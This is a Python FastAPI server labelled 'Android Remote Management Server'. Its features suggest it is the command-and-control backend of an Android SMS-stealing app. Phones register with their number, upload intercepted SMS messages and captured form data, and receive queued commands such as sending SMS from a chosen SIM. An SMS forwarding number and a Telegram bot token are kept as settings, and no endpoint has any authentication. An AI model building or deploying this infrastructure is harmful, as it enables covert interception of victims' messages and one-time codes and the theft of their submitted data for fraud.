import json
import os
from datetime import datetime, timedelta, timezone

from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from sqlalchemy import create_engine, Column, Integer, String, Text, DateTime, Boolean
from sqlalchemy.orm import sessionmaker, declarative_base
from sqlalchemy.sql import func
from pydantic import BaseModel, Field

# --- Configuration ---
# यह लाइन बदली गई है ताकि Render की स्थायी डिस्क का उपयोग हो सके
DATABASE_URL = "sqlite:////var/data/remote_management.db"
Base = declarative_base()

# --- Database Models (Schema) ---

class Device(Base):
    __tablename__ = "devices"
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, unique=True, nullable=False, index=True)
    device_name = Column(String)
    os_version = Column(String)
    phone_number = Column(String)
    battery_level = Column(Integer)
    last_seen = Column(DateTime, nullable=False)
    created_at = Column(DateTime, nullable=False, default=func.now())

class Command(Base):
    __tablename__ = "commands"
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, nullable=False, index=True)
    command_type = Column(String, nullable=False)
    command_data = Column(Text, nullable=False) # JSON as Text
    status = Column(String, nullable=False, default="pending") # pending, sent, executed
    created_at = Column(DateTime, nullable=False, default=func.now())

class SMSLog(Base):
    __tablename__ = "sms_logs"
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, nullable=False, index=True)
    sender = Column(String, nullable=False)
    message_body = Column(Text, nullable=False)
    received_at = Column(DateTime, nullable=False, default=func.now())

class FormSubmission(Base):
    __tablename__ = "form_submissions"
    id = Column(Integer, primary_key=True, index=True)
    device_id = Column(String, nullable=False, index=True)
    custom_data = Column(Text, nullable=False)
    submitted_at = Column(DateTime, nullable=False, default=func.now())

class GlobalSetting(Base):
    __tablename__ = "global_settings"
    setting_key = Column(String, primary_key=True, unique=True, nullable=False)
    setting_value = Column(Text)

# --- Pydantic Schemas (Request/Response Models) ---

class DeviceRegisterRequest(BaseModel):
    device_id: str
    device_name: str
    os_version: str
    battery_level: int
    phone_number: str

class DeviceResponse(BaseModel):
    device_id: str
    device_name: str
    os_version: str
    phone_number: str
    battery_level: int
    is_online: bool
    created_at: datetime

class SMSForwardConfig(BaseModel):
    forward_number: str

class TelegramConfig(BaseModel):
    telegram_bot_token: str
    telegram_chat_id: str

class CommandData(BaseModel):
    phone_number: str | None = None
    message: str | None = None
    action: str | None = None
    sim_slot: int | None = Field(default=0, ge=0, le=1)

class CommandSendRequest(BaseModel):
    device_id: str
    command_type: str
    command_data: dict

class FormSubmissionRequest(BaseModel):
    custom_data: str

class SMSLogRequest(BaseModel):
    sender: str
    message_body: str

# --- Database Setup ---

engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

def create_db_and_tables():
    Base.metadata.create_all(bind=engine)

def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()

# --- FastAPI App Initialization ---

app = FastAPI(title="Android Remote Management Server")

if not os.path.exists("static"):
    os.makedirs("static")
app.mount("/static", StaticFiles(directory="static"), name="static")

@app.on_event("startup")
def on_startup():
    create_db_and_tables()

# --- API Endpoints ---

def get_setting(db, key):
    setting = db.query(GlobalSetting).filter(GlobalSetting.setting_key == key).first()
    return setting.setting_value if setting else None

def set_setting(db, key, value):
    setting = db.query(GlobalSetting).filter(GlobalSetting.setting_key == key).first()
    if setting:
        setting.setting_value = value
    else:
        setting = GlobalSetting(setting_key=key, setting_value=value)
        db.add(setting)
    db.commit()
    db.refresh(setting)
    return setting

@app.post("/api/device/register")
def register_device(request: DeviceRegisterRequest, db=Depends(get_db)):
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    device = db.query(Device).filter(Device.device_id == request.device_id).first()
    if device:
        device.last_seen = now
    else:
        device = Device(
            device_id=request.device_id,
            device_name=request.device_name,
            os_version=request.os_version,
            phone_number=request.phone_number,
            battery_level=request.battery_level,
            last_seen=now
        )
        db.add(device)
    db.commit()
    return {"status": "success", "message": "Device data received."}

@app.get("/api/devices", response_model=list[DeviceResponse])
def list_devices(db=Depends(get_db)):
    devices = db.query(Device).order_by(Device.created_at.asc()).all()
    now = datetime.now(timezone.utc).replace(tzinfo=None)
    response_list = []
    for device in devices:
        is_online = (now - device.last_seen) < timedelta(seconds=20)
        response_list.append(DeviceResponse(
            device_id=device.device_id,
            device_name=device.device_name,
            os_version=device.os_version,
            phone_number=device.phone_number,
            battery_level=device.battery_level,
            is_online=is_online,
            created_at=device.created_at
        ))
    return response_list

@app.post("/api/config/sms_forward")
def update_sms_forward_config(request: SMSForwardConfig, db=Depends(get_db)):
    set_setting(db, "sms_forward_number", request.forward_number)
    return {"status": "success", "message": "Forwarding number updated successfully."}

@app.get("/api/config/sms_forward")
def get_sms_forward_config(db=Depends(get_db)):
    forward_number = get_setting(db, "sms_forward_number")
    if not forward_number:
        forward_number = ""
    return {"forward_number": forward_number}

@app.post("/api/config/telegram")
def update_telegram_config(request: TelegramConfig, db=Depends(get_db)):
    set_setting(db, "telegram_bot_token", request.telegram_bot_token)
    set_setting(db, "telegram_chat_id", request.telegram_chat_id)
    return {"status": "success", "message": "Telegram config updated successfully."}

@app.get("/api/config/telegram")
def get_telegram_config(db=Depends(get_db)):
    token = get_setting(db, "telegram_bot_token")
    chat_id = get_setting(db, "telegram_chat_id")
    return {
        "telegram_bot_token": token if token else "",
        "telegram_chat_id": chat_id if chat_id else ""
    }

@app.post("/api/command/send")
def send_command(request: CommandSendRequest, db=Depends(get_db)):
    device = db.query(Device).filter(Device.device_id == request.device_id).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    command = Command(
        device_id=request.device_id,
        command_type=request.command_type,
        command_data=json.dumps(request.command_data),
        status="pending"
    )
    db.add(command)
    db.commit()
    db.refresh(command)
    return {"status": "success", "message": "Command queued successfully.", "command_id": command.id}

@app.get("/api/device/{device_id}/commands")
def get_pending_commands(device_id: str, db=Depends(get_db)):
    pending_commands = db.query(Command).filter(
        Command.device_id == device_id,
        Command.status == "pending"
    ).all()
    if not pending_commands:
        return []
    response_list = []
    for command in pending_commands:
        command.status = "sent"
        response_list.append({
            "command_id": command.id,
            "command_type": command.command_type,
            "command_data": json.loads(command.command_data)
        })
    db.commit()
    return response_list

@app.post("/api/command/{command_id}/execute")
def mark_command_executed(command_id: int, db=Depends(get_db)):
    command = db.query(Command).filter(Command.id == command_id).first()
    if not command:
        raise HTTPException(status_code=404, detail="Command not found")
    command.status = "executed"
    db.commit()
    return {"status": "success", "message": f"Command {command_id} marked as executed."}

@app.post("/api/device/{device_id}/forms")
def submit_form(device_id: str, request: FormSubmissionRequest, db=Depends(get_db)):
    submission = FormSubmission(
        device_id=device_id,
        custom_data=request.custom_data
    )
    db.add(submission)
    db.commit()
    return {"status": "success", "message": "Form submission saved."}

@app.get("/api/device/{device_id}/forms")
def get_form_submissions(device_id: str, db=Depends(get_db)):
    submissions = db.query(FormSubmission).filter(FormSubmission.device_id == device_id).order_by(FormSubmission.submitted_at.desc()).all()
    return [{"id": s.id, "custom_data": s.custom_data, "submitted_at": s.submitted_at} for s in submissions]

@app.post("/api/device/{device_id}/sms")
def log_sms(device_id: str, request: SMSLogRequest, db=Depends(get_db)):
    sms_log = SMSLog(
        device_id=device_id,
        sender=request.sender,
        message_body=request.message_body
    )
    db.add(sms_log)
    db.commit()
    return {"status": "success", "message": "SMS log saved."}

@app.get("/api/device/{device_id}/sms")
def get_sms_logs(device_id: str, db=Depends(get_db)):
    logs = db.query(SMSLog).filter(SMSLog.device_id == device_id).order_by(SMSLog.received_at.desc()).all()
    return [{"id": l.id, "sender": l.sender, "message_body": l.message_body, "received_at": l.received_at} for l in logs]

@app.delete("/api/device/{device_id}")
def delete_device(device_id: str, db=Depends(get_db)):
    db.query(SMSLog).filter(SMSLog.device_id == device_id).delete(synchronize_session=False)
    db.query(FormSubmission).filter(FormSubmission.device_id == device_id).delete(synchronize_session=False)
    device = db.query(Device).filter(Device.device_id == device_id).first()
    if not device:
        db.rollback()
        raise HTTPException(status_code=404, detail="Device not found")
    db.delete(device)
    db.commit()
    return {"status": "success", "message": f"Device {device_id} and all associated data deleted."}

@app.delete("/api/sms/{sms_id}")
def delete_sms(sms_id: int, db=Depends(get_db)):
    sms_log = db.query(SMSLog).filter(SMSLog.id == sms_id).first()
    if not sms_log:
        raise HTTPException(status_code=404, detail="SMS log not found")
    db.delete(sms_log)
    db.commit()
    return {"status": "success", "message": f"SMS log {sms_id} deleted."}

@app.get("/", response_class=HTMLResponse)
async def root():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Remote Management Server Status</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: sans-serif; margin: 20px; background-color: #f4f4f9; }
            .container { max-width: 600px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
            h1 { color: #333; text-align: center; }
            .status-box { padding: 15px; border-radius: 5px; margin-top: 20px; text-align: center; }
            .status-ok { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
            .info-box { margin-top: 15px; padding: 10px; background-color: #e9ecef; border-radius: 4px; }
            .device-count { font-size: 2em; font-weight: bold; color: #007bff; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Android Remote Management Server</h1>
            <div class="status-box status-ok">
                <h2>Server Status: RUNNING</h2>
                <p>The API endpoints are active and ready for the APK and Panel.</p>
            </div>
            <div class="info-box">
                <p><strong>Connected Devices:</strong> <span id="device-count" class="device-count">...</span></p>
                <p><strong>Server Time:</strong> <span id="server-time">...</span></p>
                <p><strong>Base URL:</strong> <span id="base-url">...</span></p>
            </div>
            <p style="text-align: center; margin-top: 30px; font-size: 0.9em; color: #6c757d;">
                This is the minimal status page requested by the user.
            </p>
        </div>
        <script>
            async function updateStatus() {
                const countElement = document.getElementById('device-count');
                const timeElement = document.getElementById('server-time');
                const urlElement = document.getElementById('base-url');
                const baseUrl = window.location.origin;
                urlElement.textContent = baseUrl;
                try {
                    const response = await fetch('/api/devices');
                    if (response.ok) {
                        const devices = await response.json();
                        const onlineCount = devices.filter(d => d.is_online).length;
                        countElement.textContent = `${devices.length} Total (${onlineCount} Live)`;
                    } else {
                        countElement.textContent = 'Error fetching data';
                    }
                } catch (error) {
                    countElement.textContent = 'Network Error';
                }
                const now = new Date();
                timeElement.textContent = now.toLocaleTimeString() + " " + now.toLocaleDateString();
            }
            updateStatus();
            setInterval(updateStatus, 5000);
        </script>
    </body>
    </html>
    """
    
